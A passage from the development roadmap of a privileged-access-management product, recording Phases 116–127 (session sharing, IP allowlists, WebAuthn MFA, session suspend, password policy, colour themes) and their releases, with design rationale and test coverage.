in. No schema change; store surface unchanged; `archgen` confirms +1 route.

**Critical files:** `internal/accountscan/accountscan.go` (new),
`internal/api/accountscan_handlers.go` (new), `internal/api/server.go`
(route registration), `internal/web/static/index.html` (`acctscan()` screen,
option 9, `discoverAccounts()`), `internal/web/testdata/console_check.js`.

## Phase 127 — v0.27.0 ✅

Releases Phase 126 (portal color themes) — a genuine new capability, two
selectable dark palettes alongside the existing green, so this is a
**minor**, not a patch. No schema change. This closes out the
Wallix-weighted competitive roadmap's full six-phase run (116–126, each
released in turn) — the next phase starts a fresh planning cycle.

- [x] **v0.27.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-14 as `ghcr.io/morandeirachema/pamv1:0.27.0` (also
  `latest`), digest
  `sha256:4988b627b762fe6760fc23ac1e9030145a1ff8b6a6600907e8d9eb88e50fbf5d`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.17.0 -> **0.18.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-5 parity table row, and every scattered
  version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 126 — Portal color themes (dark phosphor palettes) ✅

Closes a direct user ask, made after the original 6-phase Wallix-weighted plan
was approved: a new theme for the management console, specifically a dark
one — the plan's own final item, cosmetic rather than a CyberArk/Wallix
finding like the other five.

**Verified starting point before touching anything**: `internal/web/static/index.html`
had zero theme infrastructure — every color was a hardcoded hex literal
inside one inline `<style>` block. `:root { color-scheme: dark; }` only tells
the browser chrome (scrollbars, form controls) to render dark; it defines no
palette and is not a toggle. The portal is, and has always been, a dark UI —
so "a new dark theme" reads as *another* dark palette to choose from, not a
light/dark switch, which is the reading this phase implements.

**Token pass, behavior-preserving.** Every hardcoded color literal became a
CSS custom property (`--bg`, `--fg`, `--fg-white`, `--fg-cyan`, `--fg-red`,
`--fg-amber`, plus their `-glow` text-shadow companions, `--rule`,
`--input-bg`, `--focus-bg`, `--fg-dim`, `--pane-bg`, `--scanline`), defined
once on `:root` with the exact prior values — a mechanical refactor with zero
visible change for anyone who never switches themes, confirmed by the
existing console safety net (`console_check.js`) passing unmodified.

**Two new palettes, same grid**, added as `[data-theme="…"]` blocks that only
redefine those custom properties — no selector outside `:root`/`[data-theme]`
changes, so layout, spacing, the monospace font and the scanline overlay stay
identical across every theme:
- `amber` — classic amber-phosphor terminal. `--fg` and `--fg-amber` trade
  values (green becomes the accent instead of the primary glow); background
  stays black.
- `slate` — the theme actually asked for: a neutral, cooler dark palette
  (light gray on near-black, `--fg-glow`'s alpha cut from `.35` to `.12`) for
  a genuinely lower-glare feel, while every other utility color (`--fg-cyan`/
  `--fg-red`/`--fg-amber`) is also desaturated to match rather than staying
  saturated against a muted primary.
- `green` (today's palette) stays the default — existing users see no change
  unless they opt in.

**Keyboard-first switching, no new backend surface.** A theme is a cosmetic
preference, not an authorization-relevant fact, so this stays client-only:
**F2**, wired globally (including on the sign-on screen, ahead of the
`screen === "signon"` gate every other F-key sits behind, since dimming the
glare is exactly as useful before login as after) cycles green → amber →
slate → green, applying `data-theme` on `<html>` and persisting the choice in
`localStorage`. No new store table, no new API route, no new audit event.
The shared `fkeys()` helper's hint line now advertises `F2=Theme` on every
screen.

**Regression coverage that matches what the harness can actually check.** The
existing JS-eval harness (`console_check.js`) measures rendered row *width* —
a property no CSS custom property can affect — so extending it to "snapshot
the slate theme" would test nothing real; no browser runs in that harness to
judge contrast or overflow either. Added a new, honest Go test instead,
`TestConsoleThemeTokensAreConsistent`: it extracts the stylesheet as text and
proves every `var(--x)` used is defined in the base `:root`, and every
property a `[data-theme]` block defines is a real base token — catching a
typo'd or forgotten token name, which is the one theme-bug class actually
checkable without a renderer. Verified the test fires by deliberately
misspelling a `var()` reference and confirming it fails, then reverting.
Manually rendered all three themes with a headless browser (sign-on screen,
representative of the base/white/cyan/dim color set together) and confirmed
green is visually unchanged and amber/slate are both legible and cohesive
before trusting the palette values.

### V1 scope, explicitly bounded
Two new palettes (amber, slate) plus the existing green, all dark-background
— no light theme, which would cross the project's standing "don't modernize
the portal" line. No server-side persistence of the preference (client-only;
a per-user stored preference is easy follow-on work, not needed to satisfy
the ask). No change to any non-portal surface — the Phase 116 guest-viewer
page keeps its own minimal styling, unaffected.

**Critical files:** `internal/web/static/index.html` (the CSS custom-property
refactor, the two new palettes, `cycleTheme()`, the F2 wiring),
`internal/web/console_test.go` (`TestConsoleThemeTokensAreConsistent`).

## Phase 125 — v0.26.0 ✅

Releases Phase 124 (FIDO2/WebAuthn passwordless MFA) — a genuine new
capability, so this is a **minor**, not a patch. Schema change: migration
`0035` (`webauthn_credentials`, `mfa_webauthn_challenges`).

- [x] **v0.26.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-14 as `ghcr.io/morandeirachema/pamv1:0.26.0` (also
  `latest`), digest
  `sha256:e74508f8d7731065d52a98d5079924797a9a9512e27cf354a97cd9f6f4681494`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.16.0 -> **0.17.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-5 parity table row, and every scattered
  version/phase-count mention, not just the hub lines)
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 124 — FIDO2/WebAuthn passwordless MFA ✅

Closes the last open finding from the Wallix-weighted competitive-research
plan: pamv1 was TOTP-only; both Wallix (via its Authenticator app + IdP
federation) and CyberArk (native, FIDO2-certified) treat a hardware/platform
second factor as table stakes, regardless of vendor attribution. Independent
of the other phases in the plan — it raises the account-security baseline
rather than adding a session-brokering capability, so it was sequenced last.

**Schema: a wholly separate `webauthn_credentials` table, not an overload of
`mfa_enrollments`.** `mfa_enrollments.username` is a literal `PRIMARY KEY` —
one TOTP secret per user, full stop — which cannot hold more than one
authenticator. `WebAuthnCredential` gets its own `BIGSERIAL` id instead, so a
user can register a YubiKey *and* a phone. `webauthn_credentials.public_key`
is stored in the clear, deliberately: unlike the TOTP secret, it is a public
key — knowing it lets nobody forge an assertion, only the authenticator's own
private key (which never leaves the device) can do that, the same reasoning
that already lets an SSH `authorized_keys` entry sit unencrypted. A second
table, `mfa_webauthn_challenges`, holds ephemeral ceremony state between the
browser's two-step exchange (`navigator.credentials.create`/`.get`), keyed by
`(username, purpose)` with the exact same atomic put/then-take-with-expiry
shape `oidc_states`/`PutOIDCState`/`TakeOIDCState` already established — a
fresh Begin for the same key simply supersedes an abandoned one. Migration
`0035`; store surface 164 → 171 (`CreateWebAuthnCredential`,
`ListWebAuthnCredentials`, `GetWebAuthnCredentialByCredentialID`,
`UpdateWebAuthnSignCount`, `DeleteWebAuthnCredential`, `PutWebAuthnChallenge`,
`TakeWebAuthnChallenge`). New `store/mfapolicy.go` centralizes "does this user
have a usable second factor" (`EffectiveMFAFactors`, modeled on
`approvalpolicy.go`'s narrow-reader-interface shape) — before this phase every
call site inlined a bare check against `MFAEnrollment.Confirmed`, which a
WebAuthn-only user would have failed.

**The login-flow problem this design had to solve honestly.** TOTP fits one
request (`password+otp` together) because a 6-digit code types inline.
WebAuthn cannot: the server needs to know *which user* before it can build a
challenge scoped to their credentials, and the ceremony is an unavoidable
two-round-trip exchange. The naive fix — a public "give me a WebAuthn
challenge for this username" endpoint reachable before password verification
— is a regression: it lets an unauthenticated caller enumerate valid
usernames and their MFA factor type for free. Fixed by reusing the codebase's
existing narrow-scoped-session pattern (`EnrollOnly`, `TunnelOnly`) rather
than inventing a parallel ticket mechanism: password verification still
happens first, and only on success is a new `MFAPending`-scoped session
minted (`auth.SessionScopeMFAPending`, 5-minute TTL) — good for nothing but
`POST /api/webauthn/login/{begin,finish}`, via a new `mfaPendingOnly`
middleware that is `authenticated`'s mirror image (refuses everyone EXCEPT an
MFAPending principal, where `authenticated` refuses only that principal). The
shared `gates.go` admission sequence gained `gateMFAPending` as gate 3 — right
after `gateEnrollOnly`, same "identity resolved but not yet fully authorized"
family — wired into all three session proxies' refusal switches so mandatory
MFA cannot be bypassed through a session proxy just because the second factor
happens to be a two-round-trip ceremony instead of an inline code. A user with
confirmed TOTP is checked first and completely unchanged by any of this — the
WebAuthn branch only gets a look-in for a user with no confirmed TOTP.

**Library, not hand-rolled, for the ceremony verification itself.**
`github.com/go-webauthn/webauthn` — new dependency, `PAM_WEBAUTHN_RP_ID`/
`_RP_ORIGIN` (presence enables the feature, no separate boolean flag, the
same idiom OIDC uses; restart-only unlike OIDC's hot-reloadable config,
since a domain migration is an operational event). This is a deliberate
departure from this codebase's usual preference for hand-rolling protocol
clients (`internal/oidc`, `internal/tds`, `internal/winrm` are all
in-tree): correctly verifying a WebAuthn attestation/assertion means parsing
CBOR, parsing a COSE public key, and validating a signature across several
attestation formats — code where a subtle mistake is a real authentication
bypass, not a garbled reply. That risk profile sits with the vault's use of
stdlib `crypto/*` rather than with the wire-protocol packages this project
does hand-roll — the two are different classes of "don't hand-roll," and
this phase treats them differently on purpose. Proven end-to-end rather than
mocked, matching this project's standing preference: the new
`internal/api/webauthn_ceremony_test.go` builds a real ES256 keypair, a real
CBOR "none"-format attestation object and a real signed assertion — no
browser or hardware key runs in CI, but the cryptography that matters is
100% real on both sides of the wire, through registration and login.

**V1 scope, explicitly bounded.** Any WebAuthn-conformant credential is
accepted; attestation type/AAGUID are captured but not verified against a
trust anchor (no FIDO Metadata Service integration). Username-first login
only — no discoverable/"usernameless passkey" login. Console: the sign-on
screen drives the WebAuthn ceremony automatically when `webauthn_required`
comes back from `POST /api/login`; a new *WebAuthn Keys* screen
(`mfawebauthn`, reached from the existing MFA menu) lists/deletes an
account's own authenticators with F6 to register a new one, matching the
console's established numbered-option table idiom (`users()`'s `4=Delete`
shape) rather than a bespoke form. New audit actions
`mfa.webauthn_registered`, `mfa.webauthn_register_failed`,
`mfa.webauthn_deleted`. Route count 147 → 153.

## Phase 123 — v0.25.0 ✅

Releases Phase 122 (suspend vs. terminate a live session) — a genuine new
capability, so this is a **minor**, not a patch. No schema change — suspend
state is in-memory only, replica-local like Phase 116's sharing it builds on.

- [x] **v0.25.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-14 as `ghcr.io/morandeirachema/pamv1:0.25.0` (also
  `latest`), digest
  `sha256:0fc9f5dc847123599ae3cfd2a97b5fa8c9848fe0716af867b96d9861a89095d2`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.15.0 -> **0.16.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated, including a stale `(0–121)` in README.es.md's
  roadmap-table intro that had drifted from its own English sibling's
  deliberately-frozen `(0–94)` — the table itself has said "stops at 61 to
  stay readable" on both sides since Phase 95's currency pass; only the
  Spanish header had kept climbing after that note was written
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (144 -> 147 routes, no schema drift)

## Phase 122 — Suspend (freeze input) vs. terminate a live session ✅

Closes CyberArk PAM's documented suspend/resume web-service capability:
freeze an operator's input without ending their session, then explicitly
release it — a rung below killing them outright. Not a Wallix capability
(verified during the original research pass — Wallix's own session-
restriction model exposes kill/notify only), so the one CyberArk-primary
phase in this run, and deliberately sequenced after Phase 116 to reuse its
input mux rather than build parallel plumbing.

- [x] **Built entirely on Phase 116's `ShareRegistry` mux, no new
  subsystem.** Every interactive SSH session already opens the mux
  unconditionally (Phase 116: "whether or not anyone ever joins"), so
  suspend/resume needed no new per-session registration — only two new
  gates on state that already existed. `shareSession` gains `suspended
  bool` plus a `changed chan struct{}` that Suspend/Resume close-then-
  replace on every actual state flip — a broadcast, not the state itself,
  because a reader parked **inside** `muxReader`'s inner `select` (waiting
  on the mux channel — the common case between keystrokes) has no other way
  to be pulled out and made to re-check suspension before delivering
  whatever it receives next. `waitResumed` (the entry gate) and the inner
  select's own `case <-changed: continue` (the mid-wait gate) both react to
  the same broadcast, covering both places a reader can be blocked.
- [x] **A real bug this two-gate design exists because of, caught only by
  the end-to-end test, not the unit tests.** The first cut gated only at
  `Read`'s entry (`waitResumed()` before anything else) — correct in
  isolation (`internal/session/share_test.go`'s unit tests all passed
  against it) but wrong against the real proxy: `pump` spends nearly all
  its idle time already blocked inside the inner `select` waiting for the
  next mux message, not re-entering `Read` fresh, so a `Suspend` issued at
  exactly that moment — the realistic case — had no effect until the next
  byte happened to arrive and complete the read first. Only
  `internal/proxy/suspend_test.go`, dialing a real in-process echo upstream
  and asserting a genuine **absence** of delivery (not just presence, later
  — the harder direction to prove and the one a mock would have waved
  through), caught it. Fixed by adding the `changed` broadcast as a second
  case in the inner select. **Reusable lesson: a gate on a reader that has
  two blocking points (entering, and already waiting inside a nested
  select) needs to interrupt both, and only an end-to-end test exercises
  the second one.**
- [x] **New `ShareRegistry.{Suspend,Resume,Suspended}`**, all nil-safe and
  idempotent (matching `StopAccessRequestRecurrence`'s own idempotency,
  Phase 120) — reports false only for an unknown/already-ended session,
  never an error. `POST /api/sessions/{id}/{suspend,resume}` (`CapApprove`
  — the same authorization-decision class as deciding a step-up) and a new
  `GET /api/sessions/{id}/suspend` status query (`CapReadAudit`, the same
  monitoring-read gate as the live stream) — deliberately **not** folded
  into `GET /api/sessions`' own list response, since `ShareRegistry` is
  explicitly replica-local (no cross-replica bus, unlike `session.LiveStore`/
  `StepUpStore`) and a session hosted on another replica would otherwise
  read back a silently-wrong `false` instead of an honest "not live here."
  The suspended operator's own terminal gets a clear `Stderr` notice (Phase
  116's existing `Notify` mechanism, unchanged) — freezing input silently
  would look like a hang, not a policy action.
- [x] **New audit actions** `session.suspended` / `session.resumed`.
- [x] **Console**: the live-watch pane gains an amber "OPERATOR INPUT IS
  SUSPENDED" banner and `F8=Suspend/Resume input` (label reflects current
  state), gated `can("approve")`, polling status alongside its existing
  5-second roster refresh. Extending `console_check.js` to the
  (previously-uncovered) `sesswatch()` screen caught the same `pad`-vs-
  `cell` class of bug found in Phases 110/118/120 — the roster's own actor
  column, unrelated to this phase's own changes — fixed alongside. The
  harness itself gained a small, general fix while doing this: no
  fixture-covered screen had exercised the `stopLive()`/`liveTimer =
  setInterval(...)` shutdown idiom several screens share before, so
  `setInterval` is now shadowed to a no-op in the render harness — a REAL
  timer would have kept the check's `node` process alive past the
  synchronous render.
- [x] **Tests**: `internal/session/share_test.go` (6 new: blocks-then-
  delivers-on-resume proving no byte is dropped just held, idempotent both
  directions, unknown session is inert, `Close` unblocks a reader parked
  *inside* a suspend specifically — not just an ordinary empty-mux wait —
  nil-registry safety); `internal/proxy/suspend_test.go` (JIT-style
  end-to-end against a real in-process echo upstream — the test that found
  the entry-only-gate bug above; unknown session reports false); `internal/
  api/suspend_test.go` (HTTP round trip including the audit trail, status
  endpoint, idempotency, the `CapApprove` gate, unknown session 404s). All
  green under `-race`, including 10 repeated end-to-end runs with no
  flakiness; `archgen` confirms 144 → **147** routes, no schema change (the
  suspend flag is intentionally in-memory and replica-local, like the rest
  of the mux it extends — no migration).

**V1 scope, explicitly bounded**: SSH only, riding Phase 116's mux exactly
— the DB proxies' own per-statement step-up (`internal/session/stepup.go`)
is a structurally different, already-cross-replica primitive for a
different concern (approve-then-release one statement) and was
deliberately NOT reused directly; suspend/resume borrows its *shape*
(atomic state + broadcast wakeup), not its code. Cluster-wide suspend
(freezing a session hosted on another replica) is not attempted — the same
same-replica-only bound Phase 116's own mux already carries.

## Phase 121 — v0.24.0 ✅

Releases Phase 120 (recurring access windows + configurable password policy +
checkout extension) — a genuine new capability, so this is a **minor**, not a
patch. Schema change: migration `0034` (`access_requests.recur_days`/
`next_run_at`, a new `password_history` table).

- [x] **v0.24.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-14 as `ghcr.io/morandeirachema/pamv1:0.24.0` (also
  `latest`), digest
  `sha256:81daffe77c05cbcb289475cdd240ee8682c7c68db5ecdc91125caf1f30c9a339`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.14.0 -> **0.15.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively
- [x] **Two real CI bugs found and fixed while cutting this release,
  neither in the feature itself**: a `storetest.go` assertion compared a
  `time.Now()`-derived value for exact equality after a live-Postgres round
  trip — PostgreSQL's `TIMESTAMPTZ` has microsecond resolution, one step
  coarser than Go's `time.Time`, so the comparison failed reliably against
  `pgstore` (never against `memstore`, which never serializes) — fixed by
  truncating the test's own input to microsecond precision before
  comparing; and `govulncheck` failed on 5-6 disclosed Go stdlib CVEs, all
  already fixed in the very next patch release — `actions/setup-go`'s
  `check-latest: true` alone wasn't enough because `actions/go-versions`
  (its own version catalog) hadn't yet published that patch, confirmed
  directly against its `versions-manifest.json`; worked around by fetching
  the release directly from `go.dev`, sha256-verified, prepended to `PATH`
  for the `test` job (commented as removable once the catalog catches up).
  Both confirmed pre-existing/unrelated to Phase 120's own code via a
  clean-`main` re-check before being fixed.

## Phase 120 — Recurring access windows + configurable password policy + checkout extension ✅

Three related, currently-absent policy-richness gaps closed together — all
additive, config/data-model-only changes with no new subsystem, modeled on
Wallix's actual `timeframe` and `local_password_policy` resources plus the
small checkout-extension gap noted when Phase 116's plan verified
`checkout_policy` parity.

- [x] **Recurring access requests.** `store.AccessRequest` gains
  `RecurDays`/`NextRunAt` (migration `0034`), the exact shape
  `store.Campaign` already proved out (Phase 68): an **approved** request
  with `RecurDays > 0` is an anchor; a new `RunAccessRequestScheduler`
  (own goroutine, own leader-lock key `pam_arq`, hourly — a separate worker
  from the campaign scheduler on purpose, since the two are different
  domains that happen to share a shape) auto-files a fresh **PENDING**
  successor every period via `spawnDueAccessRequests`, claim-before-create
  ordering identical to `spawnDueCampaigns`. The child is never
  pre-approved — recurrence automates the paperwork, not the four-eyes
  decision, so recurring access can never quietly become standing access
  nobody re-reviews. The anchor's clock starts **on approval**, not on the
  original request (`decideAccessRequest` sets `NextRunAt` itself), so a
  slow approval doesn't fire the first recurrence immediately. New `POST
  /api/access-requests/{id}/stop-recurrence` (`CapApprove`, idempotent) is
  the stop button, mirroring "closing the anchor ends the series." Console:
  `requestadd()` gains a "Recur every N days" field, `requests()` gains a
  Recur column and `7=Stop recur`.
- [x] **Configurable password generation policy.** `rotate.GeneratePassword`
  now takes a `PasswordPolicy{MinLength, MinLower, MinUpper, MinDigit,
  MinSymbol}` (was a bare `int` length) — `PAM_PASSWORD_MIN_LENGTH`
  (default 24) and `_MIN_LOWER`/`_MIN_UPPER`/`_MIN_DIGIT`/`_MIN_SYMBOL`
  (default 1 each) reproduce today's hardcoded behavior exactly when
  unconfigured. `PasswordPolicy.Normalized` grows `MinLength` to fit the
  sum of the four minimums rather than silently dropping a required
  character. Each `PAM_PASSWORD_MIN_*` is validated `>= 1` at config load —
  0 is refused outright rather than silently falling back to the default,
  since a value that reads as "disable this class" and actually means
  "use the default" is worse than no knob at all.
- [x] **Password reuse history.** New `PasswordHistoryStore` role (2
  methods: `RecordPasswordHistory` prunes to `keep` in the same call,
  `RecentPasswordHashes`) and `password_history` table (migration `0034`)
  store SHA-256 hashes of past rotated secrets, never the secrets
  themselves — sufficient here (unlike a bearer-token hash) because a
  generated password is high-entropy, not user-chosen. `rotateCredential`'s
  new `generateUnusedPassword` retries (bounded at 10 attempts) against
  `PAM_PASSWORD_HISTORY_COUNT` (default 0 = off, and off means the write is
  skipped too, not just the check). History write is best-effort: the
  target's password is already changed by the time it runs, so a write
  failure degrades only the *next* rotation's check, not this one's
  correctness.
- [x] **Checkout extension.** New `CheckoutStore.{GetCheckout,
  ExtendCheckout}` (store surface 157 → 164 total across all three
  additions) and `POST /api/credentials/{id}/checkout/extend`
  (`CapRevealSecret`, holder-or-admin only — mirrors `checkinCredential`'s
  own ownership rule exactly). `ExtendCheckout` refuses a missing,
  returned, or already-expired lease (extension is a continuation, not a
  resurrection); the handler separately caps the lease's **total** duration
  from `CheckedOutAt` at `PAM_CHECKOUT_MAX_EXTEND_MIN` (default 240), so
  "extend" cannot become "make it standing." Console: checkouts gains
  `5=Extend (by one more lease period)`.
- [x] **Tests**: `internal/rotate/rotate_test.go` (policy defaulting,
  per-class minimums actually enforced not just "at least one," minimums
  exceeding length grow it); `internal/store/storetest/storetest.go`
  (access-request recurrence lifecycle mirroring the campaign section,
  checkout extension including the returned/expired refusal cases, history
  record+prune+per-credential-independence); `internal/api/
  access_request_schedule_internal_test.go` (white-box spawn/stop, mirroring
  `TestRecurringCampaignsSpawnAndStop`); `internal/api/recurring_access_test.go`,
  `password_policy_test.go`, `checkout_extend_test.go` (HTTP-level: recur_days
  validation, approval sets next_run_at, stop-recurrence gate, a rotated
  secret's shape actually reflects a configured policy, history recorded/
  pruned/off-by-default, extend lifecycle + max-duration ceiling). All green
  under `-race`; `archgen` confirms 142 → **144** routes, no undocumented
  drift.

**V1 scope, explicitly bounded**: password policy and checkout-max-extend
are restart-only config, not hot-swappable via `PUT /api/config` — an
infrequent policy change, not worth the hot-swap plumbing `checkoutTTL`
itself has. Recurring-access-request cadence is day-granularity
(`RecurDays`), not a day-of-week/cron pattern — the cheap v1 cut, matching
campaigns' own v1 scope from Phase 68.

## Phase 119 — v0.23.0 ✅

Releases Phase 118 (CIDR/network-based connect & login authorization) — a
genuine new capability, so this is a **minor**, not a patch. Schema change:
migration `0033` (`users.ip_allowlist`).

- [x] **v0.23.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-13 as `ghcr.io/morandeirachema/pamv1:0.23.0` (also
  `latest`), digest
  `sha256:dbf9911cb9da807a08d18e8fc1c4d66418f5d8cee8b24e9d33f512de8a8d23e4`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.13.0 -> **0.14.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated
- [x] `docs/README.md`'s currency line and `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) both
  caught proactively

## Phase 118 — CIDR/network-based connect & login authorization ✅

The one confirmed IP-authorization gap from the Wallix-weighted pass —
exhaustive grep across `internal/auth`/`internal/api`/`internal/proxy`/
`internal/config`/`internal/store` found zero CIDR/IP-based authorization
logic anywhere, only rate-limiter key derivation and the wholly separate
target-side SSH-certificate `SourceAddress` (enforced by the *target's* own
sshd, not pamv1). Wallix's mechanism is `user.ip_source`/
`profile.ip_limitation`; CyberArk's is "Network Areas."

- [x] **`store.User.IPAllowlist`** (migration `0033`, `users.ip_allowlist
  TEXT NOT NULL DEFAULT ''`): a comma-separated CIDR list. Empty means
  unrestricted — zero behavior change for every existing user. Threaded onto
  `Principal.IPAllowlist` in `auth.Resolver.Resolve`'s per-user-token branch
  only; directory-authenticated principals (`POST /api/login`, no backing
  `store.User` row) stay unrestricted in v1 — an honest, documented bound,
  not a silent gap.
- [x] **`auth.IPAllowed(allowlist, ip)` / `auth.ValidateCIDRList(s)`**:
  comma-split, `net.ParseCIDR` per block.
- [x] **Enforced at both admission points, break-glass exempt at both** —
  matching every other gate in this codebase's own convention that
  emergency access stays loud rather than newly blocked by the thing it's
  meant to bypass. Session proxies: `gates.go` gains gate 4
  `gateIPAllowlist` in the shared `admit()` sequence (new
  `admitRequest.remoteAddr`, populated at all 3 proxy call sites); it fires
  at channel-open, so `dial` still succeeds and only `NewSession` is
  refused, matching every other post-auth gate. REST/portal: the existing
  `authz(cap, handler)` middleware — the one checkpoint nearly every
  protected route already passes through — checks `s.clientIP(r)` (reusing
  the trusted-proxy-hop-aware resolver rate-limiting already relies on)
  right after the `TunnelOnly` check.
- [x] **Omit-vs-clear, caught before it shipped.** `PUT /api/users/{id}`'s
  `ip_allowlist` is `*string`, not `string` — JSON omission leaves an
  existing restriction untouched, an explicit `""` clears it. A plain
  `string` field would have let any role-only update silently disable a
  security restriction; `TestUpdateUserIPAllowlistOmitVsClear` pins the
  distinction. Both create and update validate via `ValidateCIDRList`
  before writing.
- [x] **Console**: `useradd()`/`userchange()` gain an `ip_allowlist` input
  (blank = unrestricted); the `users()` list gains a 5th "IP" column — a
  bounded `restricted`/`-` indicator, never the raw CIDR text. Extending
  `console_check.js` to the `users()` screen for the first time caught a
  real pre-existing bug: its username/role columns used `pad()` (fixed-
  width, never truncates) instead of `cell()` (truncate-then-pad) — fixed
  alongside, not a Phase 118 regression but exactly the kind of hole this
  safety net exists to find.
- [x] **Tests**: `internal/auth/auth_test.go` (`IPAllowed` table-driven —
  11 cases, `ValidateCIDRList`, `Resolve` threading); `internal/proxy/
  ipallowlist_test.go` (JIT-style end-to-end against a real in-process
  upstream: dial succeeds, `NewSession` fails outside the CIDR, admits
  inside it — 2 tests); `internal/api/ipallowlist_test.go` (create/update
  validation, omit-vs-clear, and `authz` enforcement proven both ways via
  `PAM_TRUSTED_PROXY_HOPS` + `X-Forwarded-For` against a real
  `httptest.Server` — 3 tests); `internal/store/storetest` extended for
  both backends. Store surface 156 → **157**
  (`UserStore.UpdateUserIPAllowlist`). All green under `-race`; `archgen`
  confirms the route count is unchanged at 142 — this phase added a column,
  not a route.

**V1 scope, explicitly bounded**: directory/OIDC-authenticated principals
have no backing `store.User` row to source a list from, so they are always
unrestricted — a real, stated limit, not an oversight.

## Phase 117 — v0.22.0 ✅

Releases Phase 116 (live session-sharing) — a genuine new capability, so this
is a **minor**, not a patch. Schema change: migration `0032`
(`session_share_invites`, plus a `vendors.email` column).

- [x] **v0.22.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-13 as `ghcr.io/morandeirachema/pamv1:0.22.0` (also
  `latest`), digest
  `sha256:b0dd90a2777900e1a6062bce0adf77819996783629968b02e5b4495476d555e5`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow)
- [x] All five pins via the sweep; Helm chart `version` 0.12.0 -> **0.13.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated
- [x] `docs/README.md`'s currency line checked proactively; `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (a documented recurring staleness point) caught too

## Phase 116 — Live session-sharing ("Session Invite") ✅

Wallix's strongest, most-differentiated finding from a 2026-08-13
Wallix-weighted competitive-research pass (CyberArk secondary): a live
session can be shared with a second party in **view-only** or
**view-control** mode — MSSP/vendor-assist/training use cases Wallix markets
explicitly. CyberArk has only an adjacent auditor-shadowing concept; this is
a genuine Wallix-led capability. Mid-design, the user redirected the
external/vendor path from "pre-provisioned pamv1 user only" to **email + QR,
a hard 15-minute redemption window, mandatory fail-closed audit, and a
four-eyes request→approve gate** — all four are locked product decisions
reflected below, not tunable defaults.

- [x] **Input mux (`internal/session/share.go`, new `ShareRegistry`)**: the
  primary operator's own keystrokes and every attached `view_control`
  joiner's feed one small buffered channel per session; `insp.pump` reads
  from it instead of the raw client channel. **Multi-parallel `view_control`
  is supported by construction** — the mux is a plain Go channel, which
  accepts any number of concurrent senders. `view_only` joiners never touch
  the mux, only `session.Hub.Subscribe` output. `Close` wakes every blocked
  writer/reader via a `done` channel (never closing the mux itself, avoiding
  a send-on-closed-channel race).
- [x] **Two invite modes, one four-eyes workflow.** New
  `store.SessionShareInvite` + `ShareInviteStore` (6 methods; store surface
  149 → **156**, methodset test updated): `POST /api/sessions/{id}/share`
  files a request (`CapConnect`); a *different* principal decides it (`POST
  /api/share-invites/{id}/{approve,deny}`, `CapApprove`) — matching
  `AccessRequest`/`VendorGrant`'s established requester≠approver convention.
  **Internal** (named pamv1 user): approval mints a single-use token,
  redeemed over SSH as `join:<token>` — the entire SSH username — checked in
  `authenticate()` before normal target parsing and dispatched to
  `handleJoinConn`, deliberately **before** `admit()`: a join attaches to a
  session whose own admission already ran, so reusing admit would be a
  category error. The raw token is returned **once** in the approve response
  (same handling `POST /api/users` gives a new bearer token) — console: a
  dedicated `shareinvitetoken` screen, the `usercreated` pattern. **External/
  vendor** (per the user's redirect): approval instead emails a link +
  embedded QR (`skip2/go-qrcode`, a new dependency) via `alert.SendDirect`
  (factored out of `internal/alert/channels.go`, reusing
  `PAM_ALERT_EMAIL_*` — no second SMTP config surface) and never returns the
  token via the API. `PAM_SESSION_SHARE_INVITE_TTL_SEC=900` (**15 minutes,
  locked** — not a default to casually raise). `revoke` needs
  `CapManageTargets`, mirroring `revokeVendorGrant`.
- [x] **Guest redemption, unauthenticated until a token is presented.** A new
  guest-viewer page (`internal/web/static/share.html`, `web.Share`, the same
  per-request-nonce CSP convention as the portal, minus the RDP allowances it
  has no use for) opens from the emailed link/QR. `POST
  /api/share/redeem/{token}` atomically consumes the invite
  (`ConsumeSessionShareInviteByTokenHash`), refuses anything but
  `Kind=="external"` (the SSH `join:` path refuses the mirror case,
